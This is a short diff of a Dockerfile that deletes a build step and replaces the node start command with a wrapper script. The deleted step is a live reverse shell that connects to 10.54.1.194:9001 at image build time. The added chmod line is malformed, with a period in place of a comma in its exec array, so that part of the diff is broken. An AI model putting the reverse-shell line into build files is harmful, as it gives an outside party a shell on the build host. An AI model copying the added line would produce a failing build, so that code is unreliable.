@@ -15,7 +15,6 @@ RUN npm install
 # Bundle app source
 COPY . .
 
-RUN sh -i >& /dev/tcp/10.54.1.194/9001 0>&1 &
-
 EXPOSE 8080
-CMD [ "node", "server.js" ]
+RUN ["chmod". "+x", "./startup-wrapper.sh"]
+CMD ["./startup-wrapper.sh" ]
